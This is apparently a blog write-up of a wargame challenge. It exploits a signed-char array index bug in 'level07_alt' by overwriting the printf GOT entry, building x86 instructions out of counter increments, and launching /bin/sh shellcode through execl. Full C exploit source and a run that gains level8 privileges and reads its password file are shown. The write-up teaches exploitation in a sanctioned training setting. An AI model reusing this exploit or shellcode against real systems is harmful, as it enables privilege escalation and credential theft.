<p>On the surface it&rsquo;s hard to see where this application could be attacked! It&rsquo;s one of those bit of code that seems rather non-descript, yes has a very subtle issue in it which will allow us to gain some form of control. The obvious thing to look for is where memory is modified as a result of our user input, and this leads us to the following line:</p>

<p>{% codeblock lang:c %}
count[argv[j][i]]++;
{% endcodeblock %}</p>

<p>Here the code is using the <code>j</code>th word (passed in on the command line via <code>argv</code>) and accessing its <code>i</code>th character, then using this character as an index into <code>count</code> to increment the count for that letter. The application is obviously doing a simple letter-tally. Straight up this looks like a potential point of attack because the values in <code>argv</code> are <em>signed</em> characters, and hence we can pass in values that are <strong>negative</strong> and write outside the bounds of the <code>count</code> array. Let&rsquo;s <code>objdump</code> the binary to see where <code>count</code> lives:</p>

<p>{% codeblock lang:bash %}
$ objdump -D /levels/level07_alt | grep count
08049720 <count>:
{% endcodeblock %}</p>

<p>The negative values we can use are from <code>CHAR_MIN</code> (<code>-128</code>) &times; <code>sizeof(int)</code> (<code>4</code> on a 32-bit system) to <code>0</code>. So with <code>count</code> located at <code>0x8049720</code>, it means we can write values from here, all the way back to <code>0x8049520</code>. Let&rsquo;s see what fits within this range, again by looking at the output of <code>objdump</code>:</p>

<p>{% codeblock lang:bash %}
$ objdump -D /levels/level07_alt
&hellip; snip &hellip;</p>

<p>Disassembly of section .ctors:</p>

<p>080495ec &lt;<strong>CTOR_LIST</strong>>:
 80495ec:   ff                      (bad)<br/>
 80495ed:   ff                      (bad)<br/>
 80495ee:   ff                      (bad)<br/>
 80495ef:   ff 00                   incl   (%eax)</p>

<p>080495f0 &lt;<strong>CTOR_END</strong>>:
 80495f0:   00 00                   add    %al,(%eax)
  &hellip;</p>

<p>Disassembly of section .dtors:</p>

<p>080495f4 &lt;<strong>DTOR_LIST</strong>>:
 80495f4:   ff                      (bad)<br/>
 80495f5:   ff                      (bad)<br/>
 80495f6:   ff                      (bad)<br/>
 80495f7:   ff 00                   incl   (%eax)</p>

<p>080495f8 &lt;<strong>DTOR_END</strong>>:
 80495f8:   00 00                   add    %al,(%eax)
  &hellip;</p>

<p>Disassembly of section .jcr:</p>

<p>080495fc &lt;<strong>JCR_END</strong>>:
 80495fc:   00 00                   add    %al,(%eax)
  &hellip;</p>

<p>Disassembly of section .dynamic:</p>

<p>08049600 &lt;_DYNAMIC>:
 8049600:   01 00                   add    %eax,(%eax)
 8049602:   00 00                   add    %al,(%eax)
 8049604:   10 00                   adc    %al,(%eax)
 8049606:   00 00                   add    %al,(%eax)
 8049608:   0c 00                   or     $0x0,%al
 804960a:   00 00                   add    %al,(%eax)
 804960c:   78 82                   js     8049590 &lt;<strong>FRAME_END</strong>+0xfa8>
 804960e:   04 08                   add    $0x8,%al
 8049610:   0d 00 00 00 9c          or     $0x9c000000,%eax
 8049615:   85 04 08                test   %eax,(%eax,%ecx,1)
 8049618:   04 00                   add    $0x0,%al
 804961a:   00 00                   add    %al,(%eax)
 804961c:   48                      dec    %eax
 804961d:   81 04 08 f5 fe ff 6f    addl   $0x6ffffef5,(%eax,%ecx,1)
 8049624:   70 81                   jo     80495a7 &lt;<strong>FRAME_END</strong>+0xfbf>
 8049626:   04 08                   add    $0x8,%al
 8049628:   05 00 00 00 e0          add    $0xe0000000,%eax
 804962d:   81 04 08 06 00 00 00    addl   $0x6,(%eax,%ecx,1)
 8049634:   90                      nop
 8049635:   81 04 08 0a 00 00 00    addl   $0xa,(%eax,%ecx,1)
 804963c:   4c                      dec    %esp
 804963d:   00 00                   add    %al,(%eax)
 804963f:   00 0b                   add    %cl,(%ebx)
 8049641:   00 00                   add    %al,(%eax)
 8049643:   00 10                   add    %dl,(%eax)
 8049645:   00 00                   add    %al,(%eax)
 8049647:   00 15 00 00 00 00       add    %dl,0x0
 804964d:   00 00                   add    %al,(%eax)
 804964f:   00 03                   add    %al,(%ebx)
 8049651:   00 00                   add    %al,(%eax)
 8049653:   00 d4                   add    %dl,%ah
 8049655:   96                      xchg   %eax,%esi
 8049656:   04 08                   add    $0x8,%al
 8049658:   02 00                   add    (%eax),%al
 804965a:   00 00                   add    %al,(%eax)
 804965c:   18 00                   sbb    %al,(%eax)
 804965e:   00 00                   add    %al,(%eax)
 8049660:   14 00                   adc    $0x0,%al
 8049662:   00 00                   add    %al,(%eax)
 8049664:   11 00                   adc    %eax,(%eax)
 8049666:   00 00                   add    %al,(%eax)
 8049668:   17                      pop    %ss
 8049669:   00 00                   add    %al,(%eax)
 804966b:   00 60 82                add    %ah,-0x7e(%eax)
 804966e:   04 08                   add    $0x8,%al
 8049670:   11 00                   adc    %eax,(%eax)
 8049672:   00 00                   add    %al,(%eax)
 8049674:   58                      pop    %eax
 8049675:   82                      (bad)<br/>
 8049676:   04 08                   add    $0x8,%al
 8049678:   12 00                   adc    (%eax),%al
 804967a:   00 00                   add    %al,(%eax)
 804967c:   08 00                   or     %al,(%eax)
 804967e:   00 00                   add    %al,(%eax)
 8049680:   13 00                   adc    (%eax),%eax
 8049682:   00 00                   add    %al,(%eax)
 8049684:   08 00                   or     %al,(%eax)
 8049686:   00 00                   add    %al,(%eax)
 8049688:   fe                      (bad)<br/>
 8049689:   ff                      (bad)<br/>
 804968a:   ff 6f 38                ljmp   <em>0x38(%edi)
 804968d:   82                      (bad)<br/>
 804968e:   04 08                   add    $0x8,%al
 8049690:   ff                      (bad)<br/>
 8049691:   ff                      (bad)<br/>
 8049692:   ff 6f 01                ljmp   </em>0x1(%edi)
 8049695:   00 00                   add    %al,(%eax)
 8049697:   00 f0                   add    %dh,%al
 8049699:   ff                      (bad)<br/>
 804969a:   ff 6f 2c                ljmp   *0x2c(%edi)
 804969d:   82                      (bad)<br/>
 804969e:   04 08                   add    $0x8,%al
  &hellip;</p>

<p>Disassembly of section .got:</p>

<p>080496d0 &lt;.got>:
 80496d0:   00 00                   add    %al,(%eax)
  &hellip;</p>

<p>Disassembly of section .got.plt:</p>

<p>080496d4 &lt;<em>GLOBAL_OFFSET_TABLE</em>>:
 80496d4:   00 96 04 08 00 00       add    %dl,0x804(%esi)
 80496da:   00 00                   add    %al,(%eax)
 80496dc:   00 00                   add    %al,(%eax)
 80496de:   00 00                   add    %al,(%eax)
 80496e0:   be 82 04 08 ce          mov    $0xce080482,%esi
 80496e5:   82                      (bad)<br/>
 80496e6:   04 08                   add    $0x8,%al
 80496e8:   de                      .byte 0xde
 80496e9:   82                      (bad)<br/>
 80496ea:   04 08                   add    $0x8,%al</p>

<p>Disassembly of section .data:</p>

<p>080496ec &lt;__data_start>:
 80496ec:   00 00                   add    %al,(%eax)
  &hellip;</p>

<p>080496f0 &lt;__dso_handle>:
 80496f0:   00 00                   add    %al,(%eax)
  &hellip;</p>

<p>Disassembly of section .bss:</p>

<p>08049700 &lt;completed.5706>:
 8049700:   00 00                   add    %al,(%eax)
  &hellip;</p>

<p>08049704 &lt;dtor_idx.5708>:
  &hellip;</p>

<p>08049720 <count>:
  &hellip;
&hellip; snip &hellip;
{% endcodeblock %}</p>

<p>As you can see, there area a few sections that we can write to:</p>

<ul>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.ctors</a> section is in range, but this isn&rsquo;t going to help us because the code executed in constructors is executed before our code gets to execute.</li>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.dtors</a> section is in range, hence we might be able to write something to this section which would get executed when the program exits.</li>
<li>The <a href="http://bottomupcs.sourceforge.net/csbu/x3824.htm" title="Global Offset Tables">GOT</a> is in range, so perhaps we can look into overwriting a <code>GOT</code> entry with something else that will help us compromise the application.</li>
</ul>


<p>Let&rsquo;s take a look at what&rsquo;s in the <code>GOT</code>:</p>

<p>{% codeblock lang:bash %}
$ objdump &mdash;dynamic-reloc /levels/level07_alt</p>

<p>/levels/level07_alt:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496d0 R_386_GLOB_DAT    <strong>gmon_start</strong>
080496e0 R_386_JUMP_SLOT   <strong>gmon_start</strong>
080496e4 R_386_JUMP_SLOT   __libc_start_main
080496e8 R_386_JUMP_SLOT   printf
{% endcodeblock %}</p>

<p>Here we can see 5 entries. The first three are all executed prior to the body of the program, hence they&rsquo;re not really options for attack. The last one, <code>printf</code>, looks promising because this doesn&rsquo;t get invoked until <em>after</em> all of the input characters have been passed in. We have the opportunity to rewrite this value to point somewhere else. If we fire this up in <code>gdb</code> and take a look at the value that&rsquo;s stored in this location just before the <code>printf</code> call we find that the value is <code>0x080482de</code>. Here&rsquo;s a (tidied) snapshot from <code>gdb</code>:</p>

<p>{% codeblock lang:bash %}
gdb$ x/128x 0x8049520
0x8049520           : 0x0cec8300      0xfffd4fe8      0x18bb8dff      0x8dffffff
0x8049530           : 0xffff1883      0xc1c729ff      0xff8502ff      0xf6312474
0x8049540           : 0x8910458b      0x8b082444      0x44890c45      0x458b0424
0x8049550           : 0x24048908      0x18b394ff      0x83ffffff      0xfe3901c6
0x8049560           : 0xc483de72      0x5f5e5b0c      0x1c8bc35d      0x9090c324
0x8049570           : 0x53e58955      0xa104ec83      0x080495ec      0x74fff883
0x8049580           : 0x95ecbb13      0x90660804      0xff04eb83      0x83038bd0
0x8049590           : 0xf475fff8      0x5b04c483      0x9090c35d      0x53e58955
0x80495a0           : 0xe804ec83      0x00000000      0x2cc3815b      0xe8000011
0x80495b0           : 0xfffffd6c      0xc3c95b59      0x00000003      0x00020001
0x80495c0           : 0x67617355      0x25203a65      0x6f772073      0x0a736472
0x80495d0           : 0x00007300      0x66206325      0x646e756f      0x20692520
0x80495e0           : 0x656d6974      0x000a7325      0x00000000      0xffffffff
0x80495f0 <CTE>     : 0x00000000      0xffffffff      0x00000000      0x00000000
0x8049600 <DYN>     : 0x00000001      0x00000010      0x0000000c      0x08048278
0x8049610 &lt;DYN+16>  : 0x0000000d      0x0804859c      0x00000004      0x08048148
0x8049620 &lt;DYN+32>  : 0x6ffffef5      0x08048170      0x00000005      0x080481e0
0x8049630 &lt;DYN+48>  : 0x00000006      0x08048190      0x0000000a      0x0000004c
0x8049640 &lt;DYN+64>  : 0x0000000b      0x00000010      0x00000015      0xb7fff8e0
0x8049650 &lt;DYN+80>  : 0x00000003      0x080496d4      0x00000002      0x00000018
0x8049660 &lt;DYN+96>  : 0x00000014      0x00000011      0x00000017      0x08048260
0x8049670 &lt;DYN+112> : 0x00000011      0x08048258      0x00000012      0x00000008
0x8049680 &lt;DYN+128> : 0x00000013      0x00000008      0x6ffffffe      0x08048238
0x8049690 &lt;DYN+144> : 0x6fffffff      0x00000001      0x6ffffff0      0x0804822c
0x80496a0 &lt;DYN+160> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496b0 &lt;DYN+176> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496c0 &lt;DYN+192> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496d0           : 0x00000000      0x08049600      0xb7fff8f8      0xb7ff65f0
0x80496e0 &lt;GOT+12>  : 0x080482be      0xb7ea9bc0      0x080482de      0x00000000  &lt;&mdash; just here
0x80496f0 <DSO>     : 0x00000000      0x00000000      0x00000000      0x00000000
0x8049700           : 0x00000000      0x00000000      0x00000000      0x00000000
0x8049710           : 0x00000000      0x00000000      0x00000000      0x00000000
{% endcodeblock %}</p>

<p>Where:</p>

<ul>
<li><code>CTE</code> &ndash;> CTOR END</li>
<li><code>DYN</code> &ndash;> DYNAMIC</li>
<li><code>GOT</code> &ndash;> GLOBAL OFFSET TABLE</li>
<li><code>DSO</code> &ndash;> DSO HANDLE</li>
</ul>


<p>Remember that the application only allows us to increment existing values one at a time for every &ldquo;index&rdquo; (ie. character) that is passed on the command line. As a result, this value is what we have to add start with, and any address we want to point to has to come after this. Unfortunately for us, there is a limitation on the command line which prevents us from passing in any more than 128k characters. This is going to bite us in the butt later on.</p>

<p>We need to be able to point this address to an area of memory that we control. It&rsquo;d be great if we could point this straight at <code>argv</code>, but we can&rsquo;t do that. Why? Because:</p>

<ol>
<li>The <code>count</code> array is an array of 32-bit integers. This means we can only increment whole <strong>word</strong> values, we can&rsquo;t increment individual <em>bytes</em>.</li>
<li>Areas of memory that we control, such as <code>argv[N]</code>, are in the high address ranges (think something like <code>o0xbffff___</code>). To increment a word value from the <code>printf</code> source value to a value like this, or even another value on the stack, we would need to increment that value too many times. We don&rsquo;t have the command-line character budget to be able to do that.</li>
</ol>


<p>This means that if we want to point the entry to something we control, we&rsquo;re going to have to point it to <code>count</code> +/&ndash; 128 words. This comes with its own set of issues:</p>

<ul>
<li>Within this range we would need to craft our own instructions that get executed, using nothing but incrementing values.</li>
<li>Realistically, we can only write to the lower 2 bytes of each 4-byte word. If we attempt to write higher we either blow our budget or waste too many characters on a single instruction.</li>
<li>The area of memory that we know we have control over that has predictable values prior to our code running is the intended storage area for the <code>count</code> array and at the start of the program that entire area is set to <code>zero</code>.</li>
<li>To my knowledge, there&rsquo;s no <code>GETROOT</code> instruction in x86 assembly, nor are there any instructions less than 3 bytes in size that can do something useful without other instructions working alongside them. This means writing multiple instructions to memory.</li>
<li>If we can only modify the lower 2 bytes, then the higher 2 bytes will remain <code>00 00</code>. Given that Intel x86 is little endian, this means that after our instructions those zero bytes will always be executed before our next instruction does.</li>
<li>The opcode <code>00 00</code> translates to <code>MOV [EAX], AL</code>, which means &ldquo;take the value of the lower-order byte in <code>EAX</code> and store it in the location pointed to by <code>EAX</code>&rdquo;. This means we can&rsquo;t really use <code>EAX</code> for something useful because the code will attempt to write back to areas of memory that we are interested in, probably clobbering code or pointers that are important.</li>
</ul>


<p>Let&rsquo;s take a look at the state of <code>EAX</code> at the time the <code>printf</code> function is called:</p>

<p>{% codeblock lang:bash %}
(gdb) break *0x080484d3
Breakpoint 1 at 0x80484d3
(gdb) run abcd
Starting program: /levels/level07_alt abcd</p>

<p>Breakpoint 1, 0x080484d3 in main ()
(gdb) info registers
eax            0x61 97
ecx            0xbffffcb0   -1073742672
edx            0x80485d1    134514129
ebx            0xb7fd1ff4   -1208147980
esp            0xbffffc60   0xbffffc60
ebp            0xbffffc98   0xbffffc98
esi            0x0  0
edi            0x0  0
eip            0x80484d3    0x80484d3 &lt;main+303>
eflags         0x206    [ PF IF ]
cs             0x23 35
ss             0x2b 43
ds             0x2b 43
es             0x2b 43
fs             0x0  0
gs             0x63 99
{% endcodeblock %}</p>

<p>What&rsquo;s interesting is that <code>EAX</code> contains the value <code>0x61</code>, which is ASCII for <code>a</code>. This happens to be the first character we pass in on the command line. As a result, we do have <em>some</em> control over <code>EAX</code> at this point, but not enough to allow us to point to a valid location. Unfortunately, if we are to allow the execution of <code>MOV [EAX], AL</code>, we can&rsquo;t let <code>EAX</code> contain a value like <code>0x00000061</code>, as writing to this area will cause an access violation. We&rsquo;re going to have to change this value to a valid pointer.</p>

<p>Also, take a look at <code>ECX</code>, as it&rsquo;s value looks to be in a memory area that we have control over. It turns out that <code>ECX</code> contains a pointer to <code>argc</code>, the number of arguments passed to the program on the command line. What&rsquo;s great about this, is that <code>argv</code> immediately follows it. That is, <code>argv</code> is located at <code>ECX+4</code>. Here we can see the start of a possible attack vector.</p>

<p>To get <code>ECX</code> to point to <code>argv[0]</code> and execute, we&rsquo;d need to do the following (ASM with opcodes):</p>

<pre><code>INC ECX          41
INC ECX          41
INC ECX          41
INC ECX          41
MOV ECX, [ECX]   8B 09
JMP [ECX]        FF 21
</code></pre>

<p>This code increments <code>ECX</code> by <code>4</code>, then jumps to the address that is stored in the value <code>ECX</code> points to. This looks fine, but why can&rsquo;t we do this? Firstly, we can&rsquo;t have the instructions all close together like this. To write these values to the <code>count</code> array, we&rsquo;d have to suffer the pain of having the double zero bytes in the way, like so:</p>

<pre><code>INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>This is made worse by the fact that <code>EAX</code> contains a crap address. Given that we don&rsquo;t really care about the content of <code>ECX</code> which is just a counter of arguments passed to the program, we can overwrite <code>EAX</code> with <code>ECX</code> resulting in a valid pointer that references an address we don&rsquo;t really care about. Each time the double-null instruction is executed, a 1-byte value will be written over the top of <code>argc</code>. No more crash!</p>

<pre><code>MOV EAX, ECX     89 C8
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>Therefore somewhere in <code>count</code> we need to write these values so that the memory looks like this (little-endian remember!):</p>

<pre><code>0x0000C889 0x00004141 0x00004141 0x0000098B 0x000021FF
</code></pre>

<p>Wherever we write this value, we need to know the location so that we can increment the <code>printf</code> <code>GOT</code> entry so that it points to the start of this code. Great, we&rsquo;re well underway then, right?</p>

<p>Wrong, there is still one more issue. If this code runs successfully, then <code>EIP</code> should point directly at <code>argv[0]</code>; that is, it&rsquo;ll point at the string which contains the name of the program that was executed, <code>/levels/level07_alt</code>. This isn&rsquo;t exactly usable shellcode that is going to give us what we need. However, there is a way around this. In C, we can use the <code>execl()</code> function to invoke another binary, and specify <em>all</em> of the arguments <em>including</em> <code>argv[0]</code>. As a result, we can write some shellcode and use this for <code>argv[0]</code> instead of the program name.</p>

<p>So with all this in mind, below is the full source to the exploit (rather verbose, but it&rsquo;s on purpose) in C:</p>

<p>{% codeblock Exploit Source lang:c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;unistd.h></h1>

<p>static const char<em> target = &ldquo;/levels/level07_alt&rdquo;;
static const char</em> shellcode =
&ldquo;\x31\xc0\xb0\x46\x31\xdb\x31\xc9&rdquo;
&ldquo;\xcd\x80\xeb\x16\x5b\x31\xc0\x88&rdquo;
&ldquo;\x43\x07\x89\x5b\x08\x89\x43\x0c&rdquo;
&ldquo;\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c&rdquo;
&ldquo;\xcd\x80\xe8\xe5\xff\xff\xff\x2f&rdquo;
&ldquo;\x62\x69\x6e\x2f\x73\x68\x58\x41&rdquo;
&ldquo;\x41\x41\x41\x42\x42\x42\x42\x90&rdquo;;</p>

<p>// this is the address of the count array in memory
static const unsigned int countAddress = 0x08049720;</p>

<p>// address of the printf GOT entry
static const unsigned int printfAddress = 0x80496e8;
// initial value of the printf GOT entry
static const unsigned int printfValue = 0x080482de;</p>

<p>// The index into the count array which stores the first
// instruction which will be executed when the program
// attempts to print out the results.
static const unsigned int instructionStartIndex = 0x34;</p>

<p>// there are all the opcodes we need to write to
// the count array (in little-endian order)
static const unsigned int movEaxEcx = 0xC889;
static const unsigned int incIncEcx = 0x4141;
static const unsigned int movEcxEcx = 0x98B;
static const unsigned int jmpEcx = 0x21FF;</p>

<p>// Helper function which gives us the index into the count
// array that we would need in order to write a value to the
// given targetAddress.
unsigned int getIndex(unsigned int targetAddress)
{
  if (targetAddress &lt; countAddress)
  {</p>

<pre><code>return 0x100 - (countAddress - targetAddress &gt;&gt; 2);
</code></pre>

<p>  }</p>

<p>  return (targetAddress &ndash; countAddress) >> 2;
}</p>

<p>// Helper function which takes a buffer, a value, and a counter and will
// repeatedly write the value to the buffer until the appropriate number of
// writes has happened. It&rsquo;ll return a pointer to the memory location
// which immediately follows where it finished off.
unsigned char<em> repeat(unsigned char</em> destination, unsigned char value, int count)
{
  int i;</p>

<p>  for (i = 0; i &lt; count; ++i)
  {</p>

<pre><code>*destination++ = value;
</code></pre>

<p>  }</p>

<p>  return destination;
}</p>

<p>int main()
{
  // calculate some offets and indexes
  unsigned int startInstructionAddress = instructionStartIndex * 4 + countAddress;
  unsigned int printfIndex = getIndex(printfAddress);
  unsigned int printfInc = startInstructionAddress &ndash; printfValue;
  unsigned int argBufSize = printfInc + movEaxEcx + incIncEcx * 2 + movEcxEcx + jmpEcx;</p>

<p>  unsigned char* cursor;</p>

<p>  // allocate some memory for our command line arguments and null terminate it
  unsigned char<em> argBuf = (unsigned char</em>)malloc(argBufSize + 1);
  argBuf[argBufSize] = 0;</p>

<p>  // start by writing data required to point the printf entry to our location
  // in the count array that contains our instructions
  cursor = repeat(argBuf, printfIndex, printfInc);
  // then write all our opcodes
  cursor = repeat(cursor, instructionStartIndex, movEaxEcx);
  cursor = repeat(cursor, instructionStartIndex + 1, incIncEcx);
  cursor = repeat(cursor, instructionStartIndex + 2, incIncEcx);
  cursor = repeat(cursor, instructionStartIndex + 3, movEcxEcx);
  repeat(cursor, instructionStartIndex + 4, jmpEcx);</p>

<p>  printf(&ldquo;Attempting to exploit, good luck!\n&rdquo;);
  // finally invoke the program, passing in the shell code and
  // making sure that EAX contains 8 at the right time.
  execl(target, shellcode, &ldquo;\x08&rdquo;, argBuf, (char*)0);</p>

<p>  free(argBuf);</p>

<p>  return EXIT_SUCCESS;
}
{% endcodeblock %}</p>

<p>Upload, compile and run the exploit and this is what happens:</p>

<p>{% codeblock Exploit Run lang:bash %}
level7@io:/tmp/.oj$ ./sploit
Attempting to exploit, good luck!
sh-4.2$ id
uid=1007(level7) gid=1007(level7) euid=1008(level8) groups=1008(level8),1007(level7),1029(nosu)
sh-4.2$ cat /home/level8/.pass
&lt;&lt; &mdash; password was printed here &mdash; >>
{% endcodeblock %}</p>

<p>Game over! What a great challenge that was.</p>

<p>I&rsquo;d like to point out that this alternate level took me a <em>very long time</em> to nail. It was well worth the effort, and I learned a stack in the process.</p>

<p>Feedback is appreciated as always. Thanks for reading.</p>
]]></content>
  </entry>
  
</feed>
